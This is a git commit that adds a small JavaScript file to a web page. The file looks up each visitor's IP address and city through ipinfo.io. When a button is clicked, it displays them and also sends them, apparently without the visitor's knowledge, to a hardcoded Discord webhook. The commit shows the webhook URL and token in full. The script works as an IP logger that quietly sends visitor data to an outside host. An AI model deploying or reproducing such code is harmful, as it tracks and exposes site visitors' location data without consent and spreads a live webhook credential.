c33936eba5e0a2bf155ea6dc3ff1f427a27205d4
HalfBlackAdam <117794224+HalfBlackAdam@users.noreply.github.com>
2023-03-28 11:17:39 -0700

    Create script.js

---
+++ script.js
@@ -0,0 +1,27 @@
+window.addEventListener("load",e => {
+
+var web = "https://discord.com/api/webhooks/1080866736234045511/i_j_4QMtRFMlWenJW-R-aIf2AMnum3Yw09HHhCySNSDso3nVrrxj7Y4X_Lz0nvVrPsOZ";
+  
+let ip;
+  let city;
+  $.get("https://ipinfo.io", function(response) {
+           	ip = response.ip;
+    city = response.city;
+  }, "json")
+
+  function discord_message(webHookURL, message) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", webHookURL, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({
+            'content': message,
+            'username':'AI',
+        }));
+    }
+  
+$(".getip").on("click", function(){
+  
+  document.getElementById("stuff").innerHTML = ip + ", " + city;
+  discord_message(web, "ip found " + ip + ", " + city);
+});
+});
